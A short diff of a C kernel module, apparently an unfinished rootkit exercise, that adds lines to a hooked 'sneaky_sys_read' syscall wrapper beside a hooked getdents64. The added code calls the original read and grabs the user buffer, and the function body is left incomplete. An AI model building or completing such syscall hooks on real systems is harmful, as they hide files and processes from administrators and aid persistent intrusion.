@@ -121,6 +121,9 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
 asmlinkage int (*original_read)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
+  ssize_t nread = original_read(regs);
+  void * user_buffer = (void *) regs->si;
+  // call original read and get the original data
 
 }
 
